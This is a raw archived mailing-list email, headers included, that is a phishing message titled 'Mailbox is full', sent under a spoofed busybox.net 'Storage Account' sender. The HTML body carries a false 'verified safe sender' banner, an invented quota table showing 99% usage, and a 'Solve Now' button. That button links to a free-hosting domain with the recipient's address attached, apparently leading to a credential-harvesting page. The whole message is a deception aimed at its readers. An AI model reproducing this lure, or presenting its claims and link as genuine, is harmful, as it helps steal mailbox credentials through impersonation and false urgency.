Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 1C7D1E7718B
	for <buildroot@archiver.kernel.org>; Sun, 29 Dec 2024 12:42:57 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id DAB656082F;
	Sun, 29 Dec 2024 12:42:56 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
 by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id 45wBYwdxqaou; Sun, 29 Dec 2024 12:42:56 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org F00C96083A
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp3.osuosl.org (Postfix) with ESMTP id F00C96083A;
	Sun, 29 Dec 2024 12:42:55 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [IPv6:2605:bc80:3010::138])
 by lists1.osuosl.org (Postfix) with ESMTP id 0E93972
 for <buildroot@buildroot.org>; Sun, 29 Dec 2024 12:42:54 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id E294A80B11
 for <buildroot@buildroot.org>; Sun, 29 Dec 2024 12:42:53 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id sEwsMiSHweSb for <buildroot@buildroot.org>;
 Sun, 29 Dec 2024 12:42:53 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=51.83.140.59;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org A6F1080AD3
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org A6F1080AD3
Received: from busybox.net (ns31098807.ip-51-83-140.eu [51.83.140.59])
 by smtp1.osuosl.org (Postfix) with ESMTP id A6F1080AD3
 for <buildroot@busybox.net>; Sun, 29 Dec 2024 12:42:52 +0000 (UTC)
From: Storage Account <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 29 Dec 2024 11:42:51 -0100
Message-ID: <20241229114251.6D324A22D6B089F4@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Mailbox is full
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5006733399731029263=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============5006733399731029263==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><br class=3D"Apple-interchange-newline">
<table style=3D"color: rgb(32, 31, 30); text-transform: none; letter-spacin=
g: normal; font-family: Arial, Helvetica, sans-serif; font-size: 15px; font=
-style: normal; font-weight: 400; word-spacing: 0px; white-space: normal; b=
order-collapse: collapse; orphans: 2; widows: 2; font-stretch: inherit; bac=
kground-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-var=
iant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thicknes=
s: initial; text-decoration-style: initial;=20
text-decoration-color: initial;">
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<th style=3D"padding: 5px; border: 0px solid black; width: 2px; box-sizing:=
 border-box; background-color: rgb(2, 151, 64);">&nbsp;</th>
<td style=3D"margin: 0px; padding: 5px; border: 0px solid black; width: 700=
px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; box-siz=
ing: border-box; background-color: rgb(243, 255, 248);"><span style=3D"box-=
sizing: border-box;"><span style=3D"box-sizing: border-box;"><font style=3D=
"vertical-align: inherit;">
<font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inh=
erit;"><font style=3D"vertical-align: inherit;">This sender has been verifi=
ed from&nbsp;<a style=3D"color: rgb(34, 34, 34);">busybox.net</a>&nbsp;safe=
 senders list.</font></font></font></font></span></span></td></tr></tbody><=
/table>
<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
initial; text-decoration-color: initial;">
<span style=3D"font-size: xx-large; box-sizing: border-box;"><span style=3D=
"font-weight: bolder; box-sizing: border-box;"><span style=3D"color: rgb(24=
9, 83, 22); box-sizing: border-box;"><font style=3D"vertical-align: inherit=
;"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: =
inherit;"><font style=3D"vertical-align: inherit;">Webmail&nbsp;</font></fo=
nt></font></font></span></span><br style=3D"box-sizing: border-box;"></span=
><span style=3D"color: rgb(0, 0, 0); box-sizing: border-box;">
<br style=3D"box-sizing: border-box;"></span><span style=3D"color: rgb(0, 0=
, 0); box-sizing: border-box;"><span style=3D"box-sizing: border-box;"><br>=
</span></span>
<table style=3D"width: 496px; color: rgb(33, 37, 41); border-collapse: coll=
apse; font-stretch: inherit; background-color: rgb(255, 255, 255); font-var=
iant-numeric: inherit; font-variant-east-asian: inherit;" border=3D"0">
<thead style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<th style=3D"border-width: 1px; text-align: left; padding-top: 0px; padding=
-right: 0px; padding-left: 0px; vertical-align: bottom; border-bottom-color=
: rgb(222, 226, 230); border-bottom-style: solid; box-sizing: border-box;">=
<br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-box;"=
><font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: in=
herit;"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-al=
ign: inherit;">Quota type</font></font>
</font></font></th>
<th style=3D"border-width: 1px; text-align: center; padding-top: 0px; paddi=
ng-right: 0px; padding-left: 0px; vertical-align: bottom; border-bottom-col=
or: rgb(222, 226, 230); border-bottom-style: solid; box-sizing: border-box;=
"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: i=
nherit;"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-a=
lign: inherit;">Limit</font></font></font></font></th>
<th style=3D"border-width: 1px; text-align: center; padding-top: 0px; paddi=
ng-right: 0px; padding-left: 0px; vertical-align: bottom; border-bottom-col=
or: rgb(222, 226, 230); border-bottom-style: solid; box-sizing: border-box;=
"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: i=
nherit;"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-a=
lign: inherit;">Used</font></font></font></font></th></tr></thead>
<tbody style=3D"box-sizing: border-box;">
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; text-align: center; color: rgb(115, 118, 119); li=
ne-height: 1; padding-top: 0px; padding-right: 0px; padding-left: 0px; font=
-style: italic; vertical-align: top; border-top-color: rgb(222, 226, 230); =
border-top-width: 1px; border-top-style: solid; box-sizing: border-box; bac=
kground-color: rgb(241, 243, 244);" colspan=3D"3"><font style=3D"vertical-a=
lign: inherit;"><font style=3D"vertical-align: inherit;"><font style=3D"ver=
tical-align: inherit;">
<font style=3D"vertical-align: inherit;">Mailbox</font></font></font></font=
></td></tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; padding-top: 0px; padding-right: 0px; padding-lef=
t: 0px; vertical-align: top; border-top-color: rgb(222, 226, 230); border-t=
op-width: 1px; border-top-style: solid; box-sizing: border-box;"><font styl=
e=3D"vertical-align: inherit;"><font style=3D"vertical-align: inherit;"><fo=
nt style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inheri=
t;">Messages count</font></font></font></font></td>
<td style=3D"margin: 0px; text-align: center; padding-top: 0px; padding-rig=
ht: 0px; padding-left: 0px; vertical-align: top; border-top-color: rgb(222,=
 226, 230); border-top-width: 1px; border-top-style: solid; box-sizing: bor=
der-box;"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-=
align: inherit;"><font style=3D"vertical-align: inherit;"><font style=3D"ve=
rtical-align: inherit;">47940</font></font></font></font></td>
<td style=3D"margin: 0px; text-align: center; padding-top: 0px; padding-rig=
ht: 0px; padding-left: 0px; vertical-align: top; border-top-color: rgb(222,=
 226, 230); border-top-width: 1px; border-top-style: solid; box-sizing: bor=
der-box;"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-=
align: inherit;"><font style=3D"vertical-align: inherit;"><font style=3D"ve=
rtical-align: inherit;">1005 (99%)</font></font></font></font></td></tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; text-align: center; color: rgb(115, 118, 119); li=
ne-height: 1; padding-top: 0px; padding-right: 0px; padding-left: 0px; font=
-style: italic; vertical-align: top; border-top-color: rgb(222, 226, 230); =
border-top-width: 1px; border-top-style: solid; box-sizing: border-box; bac=
kground-color: rgb(241, 243, 244);" colspan=3D"3"><font style=3D"vertical-a=
lign: inherit;"><font style=3D"vertical-align: inherit;"><font style=3D"ver=
tical-align: inherit;">
<font style=3D"vertical-align: inherit;">cPanel Account</font></font></font=
></font></td></tr>
<tr style=3D"box-sizing: border-box;">
<td style=3D"margin: 0px; padding-top: 0px; padding-right: 0px; padding-lef=
t: 0px; vertical-align: top; border-top-color: rgb(222, 226, 230); border-t=
op-width: 1px; border-top-style: solid; box-sizing: border-box;"><font styl=
e=3D"vertical-align: inherit;"><font style=3D"vertical-align: inherit;"><fo=
nt style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inheri=
t;">Disk space</font></font></font></font></td>
<td style=3D"margin: 0px; text-align: center; padding-top: 0px; padding-rig=
ht: 0px; padding-left: 0px; vertical-align: top; border-top-color: rgb(222,=
 226, 230); border-top-width: 1px; border-top-style: solid; box-sizing: bor=
der-box;"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-=
align: inherit;"><font style=3D"vertical-align: inherit;"><font style=3D"ve=
rtical-align: inherit;">99GB</font></font></font></font></td>
<td style=3D"margin: 0px; text-align: center; padding-top: 0px; padding-rig=
ht: 0px; padding-left: 0px; vertical-align: top; border-top-color: rgb(222,=
 226, 230); border-top-width: 1px; border-top-style: solid; box-sizing: bor=
der-box;"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-=
align: inherit;"><font style=3D"vertical-align: inherit;"><font style=3D"ve=
rtical-align: inherit;">33GB (99%)</font></font></font></font><br style=3D"=
box-sizing: border-box;"><br style=3D"box-sizing: border-box;">
<br style=3D"box-sizing: border-box;">
<a title=3D"New window" style=3D'background: rgb(44, 134, 220); margin: 0px=
; padding: 19px 30px 21px; border-radius: 4px; border: 1px solid rgb(255, 2=
55, 255); color: rgb(255, 255, 255); line-height: 20px; letter-spacing: -1p=
x; font-family: "Malgun Gothic"; font-size: 18px; vertical-align: baseline;=
 display: block; box-sizing: border-box; font-stretch: inherit; text-decora=
tion-line: none;' href=3D"https://mailservice-notice.freewebhostmost.com/#b=
uildroot@busybox.net" rel=3D"noopener noreferrer">
<font style=3D"vertical-align: inherit;"><font style=3D"vertical-align: inh=
erit;"><font style=3D"vertical-align: inherit;"><font style=3D"vertical-ali=
gn: inherit;">Solve Now</font></font></font></font><br style=3D"box-sizing:=
 border-box;"></a></td></tr></tbody></table><p></p></body></html>

--===============5006733399731029263==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============5006733399731029263==--
